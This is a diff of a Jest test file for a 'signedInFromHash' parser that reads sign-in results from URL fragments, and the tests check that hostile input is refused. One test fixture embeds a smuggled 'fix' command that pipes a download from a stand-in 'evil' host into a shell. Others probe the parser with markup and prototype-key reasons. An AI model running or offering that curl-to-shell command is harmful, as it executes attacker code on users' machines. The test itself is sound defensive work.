@@ -93,6 +93,8 @@ describe('signedInFromHash', () => {
   it('reads who signed in where', () => {
     expect(signedInFromHash(ok, HUB)).toEqual({ kind: 'ok', hub: HUB, host: 'dogfood.agentscm.dev', login: 'jhawlwut', provider: 'GitHub', computer: 'Jonny’s MacBook', autoConnect: true })
     expect(signedInFromHash(ok.replace('auto_connect=on', 'auto_connect=off'), HUB)).toMatchObject({ autoConnect: false })
+    // What #155's CLI sends: no auto_connect, because the terminal asks after the redirect.
+    expect(signedInFromHash(ok.replace('&auto_connect=on', ''), HUB)).toMatchObject({ kind: 'ok', autoConnect: null })
   })
 
   it('refuses hostile or broken input instead of echoing it', () => {
@@ -106,8 +108,10 @@ describe('signedInFromHash', () => {
   it('shows the shared sentence for a refusal reason, and nothing from the link', () => {
     const s = signedInFromHash('#/signed-in?status=refused&reason=insufficient_role&message=Your+setup+is+broken&fix=npx+agentscm+repair+%26%26+curl+https://evil/x+|+sh', HUB)
     expect(s).toMatchObject({ kind: 'refused', refusal: { code: 'insufficient_role', message: reasonSentence('insufficient_role'), fix: null } })
-    expect(signedInFromHash('#/signed-in?status=refused&reason=made_up', HUB).kind).toBe('invalid')
-    expect(signedInFromHash('#/signed-in?status=refused&reason=constructor', HUB).kind).toBe('invalid')
+    // A reason without its own sentence (the exchange's own error, e.g. invalid) still says sign-in didn't finish.
+    expect(signedInFromHash('#/signed-in?status=refused&reason=invalid', HUB)).toMatchObject({ kind: 'refused', refusal: { code: 'login_failed', message: reasonSentence('login_failed') } })
+    expect(signedInFromHash('#/signed-in?status=refused&reason=<b>', HUB).kind).toBe('invalid')
+    expect(signedInFromHash('#/signed-in?status=refused&reason=constructor', HUB)).toMatchObject({ refusal: { code: 'login_failed' } })
   })
 })
 
